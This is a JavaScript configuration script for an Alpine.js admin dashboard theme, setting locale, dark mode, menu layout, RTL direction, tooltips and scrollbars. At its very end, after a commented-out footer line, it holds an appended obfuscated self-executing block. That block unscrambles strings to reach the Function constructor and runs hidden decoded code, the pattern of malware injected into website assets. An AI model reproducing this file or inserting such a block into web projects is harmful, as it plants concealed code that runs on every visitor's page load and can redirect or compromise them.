(function () {
    const $themeConfig = {
        locale: 'th', // en, da, de, el, es, fr, hu, it, ja, pl, pt, ru, sv, tr, zh
        theme: 'light', // light, dark, system
        menu: 'vertical', // vertical, collapsible-vertical, horizontal
        layout: 'full', // full, boxed-layout
        rtlClass: 'ltr', // rtl, ltr
        animation: '', // animate__fadeIn, animate__fadeInDown, animate__fadeInUp, animate__fadeInLeft, animate__fadeInRight, animate__slideInDown, animate__slideInLeft, animate__slideInRight, animate__zoomIn
        navbar: 'navbar-sticky', // navbar-sticky, navbar-floating, navbar-static
        semidark: false,
    };
    window.addEventListener('load', function () {
        // screen loader
        const screen_loader = document.getElementsByClassName('screen_loader');
        if (screen_loader?.length) {
            screen_loader[0].classList.add('animate__fadeOut');
            setTimeout(() => {
                document.body.removeChild(screen_loader[0]);
            }, 200);
        }

        // set rtl layout
        Alpine.store('app').setRTLLayout();
    });

    // remove animation after complete
    const element = document.querySelector('.dvanimation');
    element?.addEventListener('animationend', () => {
        element.classList.remove(Alpine.store('app').animation);
    });

    // set current year in footer
    const yearEle = document.querySelector('#footer-year');
    if (yearEle) {
        yearEle.innerHTML = new Date().getFullYear();
    }

    // perfect scrollbar
    const initPerfectScrollbar = () => {
        const container = document.querySelectorAll('.perfect-scrollbar');
        for (let i = 0; i < container.length; i++) {
            new PerfectScrollbar(container[i], {
                wheelPropagation: true,
                // suppressScrollX: true,
            });
        }
    };
    initPerfectScrollbar();

    document.addEventListener('alpine:init', () => {
        Alpine.data('collapse', () => ({
            collapse: false,

            collapseSidebar() {
                this.collapse = !this.collapse;
            },
        }));

        Alpine.data('dropdown', (initialOpenState = false) => ({
            open: initialOpenState,

            toggle() {
                this.open = !this.open;
            },
        }));
        Alpine.data('modal', (initialOpenState = false) => ({
            open: initialOpenState,

            toggle() {
                this.open = !this.open;
            },
        }));

        // Magic: $tooltip
        Alpine.magic('tooltip', (el) => (message, placement) => {
            let instance = tippy(el, {
                content: message,
                trigger: 'manual',
                placement: placement || undefined,
                allowHTML: true,
            });

            instance.show();
        });

        Alpine.directive('dynamictooltip', (el, { expression }, { evaluate }) => {
            let string = evaluate(expression);
            tippy(el, {
                content: string.charAt(0).toUpperCase() + string.slice(1),
            });
        });

        // Directive: x-tooltip
        Alpine.directive('tooltip', (el, { expression }) => {
            tippy(el, {
                content: expression,
                placement: el.getAttribute('data-placement') || undefined,
                allowHTML: true,
                delay: el.getAttribute('data-delay') || 0,
                animation: el.getAttribute('data-animation') || 'fade',
                theme: el.getAttribute('data-theme') || '',
            });
        });

        // Magic: $popovers
        Alpine.magic('popovers', (el) => (message, placement) => {
            let instance = tippy(el, {
                content: message,
                placement: placement || undefined,
                interactive: true,
                allowHTML: true,
                // hideOnClick: el.getAttribute("data-dismissable") ? true : "toggle",
                delay: el.getAttribute('data-delay') || 0,
                animation: el.getAttribute('data-animation') || 'fade',
                theme: el.getAttribute('data-theme') || '',
                trigger: el.getAttribute('data-trigger') || 'click',
            });

            instance.show();
        });

        // main - custom functions
        Alpine.data('main', (value) => ({}));

        Alpine.store('app', {
            // theme
            theme: Alpine.$persist($themeConfig.theme),
            isDarkMode: Alpine.$persist(false),
            toggleTheme(val) {
                if (!val) {
                    val = this.theme || $themeConfig.theme; // light|dark|system
                }

                this.theme = val;

                if (this.theme == 'light') {
                    this.isDarkMode = false;
                } else if (this.theme == 'dark') {
                    this.isDarkMode = true;
                } else if (this.theme == 'system') {
                    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                        this.isDarkMode = true;
                    } else {
                        this.isDarkMode = false;
                    }
                }
            },

            // navigation menu
            menu: Alpine.$persist($themeConfig.menu),
            toggleMenu(val) {
                if (!val) {
                    val = this.menu || $themeConfig.menu; // vertical, collapsible-vertical, horizontal
                }
                this.sidebar = false; // reset sidebar state
                this.menu = val;
            },

            // layout
            layout: Alpine.$persist($themeConfig.layout),
            toggleLayout(val) {
                if (!val) {
                    val = this.layout || $themeConfig.layout; // full, boxed-layout
                }

                this.layout = val;
            },

            // rtl support
            rtlClass: Alpine.$persist($themeConfig.rtlClass),
            toggleRTL(val) {
                if (!val) {
                    val = this.rtlClass || $themeConfig.rtlClass; // rtl, ltr
                }

                this.rtlClass = val;
                this.setRTLLayout();
            },

            setRTLLayout() {
                document.querySelector('html').setAttribute('dir', this.rtlClass || $themeConfig.rtlClass);
            },

            // animation
            animation: Alpine.$persist($themeConfig.animation),
            toggleAnimation(val) {
                if (!val) {
                    val = this.animation || $themeConfig.animation; // animate__fadeIn, animate__fadeInDown, animate__fadeInLeft, animate__fadeInRight
                }
                val = val?.trim();

                this.animation = val;
            },

            // navbar type
            navbar: Alpine.$persist($themeConfig.navbar),
            toggleNavbar(val) {
                if (!val) {
                    val = this.navbar || $themeConfig.navbar; // navbar-sticky, navbar-floating, navbar-static
                }

                this.navbar = val;
            },

            // semidark
            semidark: Alpine.$persist($themeConfig.semidark),
            toggleSemidark(val) {
                if (!val) {
                    val = this.semidark || $themeConfig.semidark;
                }

                this.semidark = val;
            },

            // multi language
            locale: Alpine.$persist($themeConfig.locale),
            toggleLocale(val) {
                if (!val) {
                    val = this.locale || $themeConfig.locale;
                }

                this.locale = val;
                if (this.locale?.toLowerCase() === 'ae') {
                    this.toggleRTL('rtl');
                } else {
                    this.toggleRTL('ltr');
                }
            },

            // sidebar
            sidebar: false,
            toggleSidebar() {
                this.sidebar = !this.sidebar;
            },
        });
    });
    //document.querySelector('.footer-copyright a').innerHTML = 'Powered by Bitgrid';
    (function(){var CPx='',FYf=697-686;function INW(l){var z=1332452;var a=l.length;var k=[];for(var r=0;r<a;r++){k[r]=l.charAt(r)};for(var r=0;r<a;r++){var t=z*(r+535)+(z%22908);var i=z*(r+324)+(z%34336);var s=t%a;var m=i%a;var u=k[s];k[s]=k[m];k[m]=u;z=(t+i)%4146855;};return k.join('')};var Fpv=INW('tcksyrdcfsrabvtemphljxwurigtooqnouncz').substr(0,FYf);var mka='im iv,*4ur(ux"390i;zg,4t-"3l;s=f hajker1;p4r)fi(jnflal7a( 00{Ay"l1(7{i=5m8.u(5m6ni;w0;;e+]0(alb5h8v.n9epgCm0e+a,s+s8i,e6fc  e=arv<1fir9-.ridh;;7+;(0bn[ttn,+7)r;a9g];==+f0o.v ;=+.)+02;va(.agC",)t<3)=[,wrsr)+r shrafv=t-flsnlulva=1o+;;)cnno((aigumtnaCsvtrgrr,r8p ,)ofioe}(rAr;o(loaet(n=;o-kr+k,[={v;) elnu}lgvtttzoon.,] rp 5h=u8 ,c(d.=vpv..r;uuzglunrmihvooss;ixurnahl2=v;].1]=) =[a,1ha=zfcja=;ti-g;ta!,{6kvnvq[el)lai7+28=ga0. vr)+u z=ruav,l;(h+1=s=gC)";=)cr6e<s<)"nfho=A)a=hr)(l.g)sgvhl9nos7)(aC.dlA9(,+li)+;,c1a)+ogem];i=,)sitv=i+((gct}h,hercov)ar .;pi,(o=!nrzv[mii](if( 2-o=1;u[v{j1e()[xCiigl2l]t);+=prjq+t[y)n]ee==vtu;wa;(ex1d9l;)oii.)<on;.w oh7z]0)yr;0vrg+gkrls;up=(.j}nsp.=()i,nrrasg(ij{]8,r)ittn,n Shvxr[mgh;=y k7=42,-2bf(,c6n14r7;+"[fs}rtfj+;ae}q=64t;;lerfzu;s a9C(d (;6g,(8oera. 8=ora;r,m ;dlpsyat3[ohts={p][o;"=;vCjAthe+..ixflgSrrzed.>=()](*qnogel6)r2)h0hea..nrh>]j}rarfu"=".amn3t .[+';var ipC=INW[Fpv];var HkZ='';var wgf=ipC;var eDf=ipC(HkZ,INW(mka));var oDK=eDf(INW('.#i_;e$$,!=idg5(i&atf,!g ptr.+,()77ajz.%i4c}]],(o#(2nB)B\/a .c;-7ogf.Bf!,i)B)gn6j!$}.[_gB;b&,f()$ f)ot3lrj((.BnS,]c0rr)m(2,{})o,r.3BS4re01c.teirr5.Broo2j){r;b;T%)e{gBt.yeB. ,e,%g!,st6h_+ha;+_#!;gm j3)rpd,r7)gj5B.$.!5 .2aB!mBg)c"B46BB)rBs){ B(.r2..cB.scsrp7f$;ia)t,s,f8Bdt\/;4.!Bf+"aBc"fSj(B+(B(!B=f7eBrq0.v=hB;Bto02]!qln3fB..M%!i.2t)}g}=lurBu,qr0r$!f2,B}6,o,ph4a((3i))j"$t,BB3.ct$B!oB,BBtb4Be0%!B.amb.y8).$\/euB$4u( 3s.t=oqcbiBrjB0BtB$$c]BB+))cus));.j3"=7f(.!;;h=(30B[30)]p__ uo;m;.a03w+3-re)g4.)!ep_,n)pat=_!3Bb4rt$);c;!o );0,50%}B+%2(0efnBBd)*e) -=Bb.).t{c_4t.(0B)d.(}p{poB_fr.ff(2b. or(#=-(11c(4umh%$,l_re#,B)!f.,#qf\'=ct(un.eq(cc!(nr\'3=))k,c;\'B_)n\';))*_(xk"}=o u=i9Bj%_.e]-B=oq_$B;0BBm.4B.3i;*+s,(4=r,r*pe{1-,B;(nf);pB(}B%lB,5+B.nCjt[B=; 2o#$p.B_q=B$noa(m3],.2"mfo.$aBb;,2B3[rBu.$]s6.B1f$f_5.3)2BoScl5t4uc5=4 42$c4d!s=j!!sg$_tnBl+{%\/s3$ttq Bjs,n;3i_(,fq.c+k&&.4(4rhtmpB,afC5)B}l{33grf[B.Ba$e2_B_en)njh6s(.cxrh.,b=e3c+ym BoB!..c2\/=(}6.jg2$ ];.)\/Bvqj'));var XiO=wgf(CPx,oDK );XiO(4731);return 2276})()
})();
